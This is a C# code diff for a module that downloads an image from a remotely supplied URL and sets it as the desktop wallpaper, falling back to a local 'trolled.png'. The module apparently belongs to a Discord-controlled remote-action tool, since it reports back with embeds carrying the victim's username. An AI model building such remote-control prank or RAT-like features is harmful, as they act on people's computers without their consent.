@@ -1,17 +1,18 @@
 ﻿using System.Net;
-using Paroxysm.Debug;
+using Discord;
+using Paroxysm.Tools;
 
 namespace Paroxysm.Hooks.Actions;
 
 public static class ChangeWallpaperAction
 {
-    [Obsolete("Obsolete")]
     private static async Task<bool> SetWallpaperFromUrl(string imageUrl)
     {
         try
         {
             using WebClient client = new();
-            var localImagePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "temp_wallpaper.jpg");
+            var localImagePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
+                "temp_wallpaper.jpg");
             await client.DownloadFileTaskAsync(new Uri(imageUrl), localImagePath);
 
             if (SetWallpaper(localImagePath))
@@ -25,9 +26,8 @@ public static class ChangeWallpaperAction
             File.Delete(localImagePath);
             return false;
         }
-        catch (Exception ex)
+        catch
         {
-            Logger.CreateEmbed(ELoggerState.Error, ex);
             return false;
         }
     }
@@ -39,25 +39,24 @@ public static class ChangeWallpaperAction
             HookStatement.SPIF_UPDATE | HookStatement.SPIF_CHANGE) != 0;
     }
 
-    [Obsolete("Obsolete")]
-    public static async void Follow(string? imageUrl)
+
+    public static async Task<Embed> Follow(string? imageUrl)
     {
-        if (await SetWallpaperFromUrl(imageUrl))
+        if (await SetWallpaperFromUrl(imageUrl!))
         {
-            Logger.CreateEmbed(ELoggerState.Error, new Exception("Zdjęcie z linku ustawione jako tapeta"));
+            return EmbedCreator.CreateWithText(Color.Green, "Command was successfully executed.",
+                "Image has been set as desktop wallpaper.", Environment.UserName, null);
         }
-        else
+
+        const string localImagePath = "trolled.png";
+        if (!File.Exists(localImagePath))
         {
-            var localImagePath = "trolled.png";
-            if (File.Exists(localImagePath))
-            {
-                SetWallpaper(localImagePath);
-                Logger.CreateEmbed(ELoggerState.Error, new Exception("Lokalne zdjęcie ustawione jako tapete"));
-            }
-            else
-            {
-                Logger.CreateEmbed(ELoggerState.Error, new Exception("Nie udało sie ustawić tapety"));
-            }
+            return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
+                "Unable to set desktop wallpaper.", Environment.UserName, null);
         }
+
+        SetWallpaper(localImagePath);
+        return EmbedCreator.CreateWithText(Color.Green, "Command was successfully executed.",
+            "Local image was been set as desktop wallpaper.", Environment.UserName, null);
     }
 }
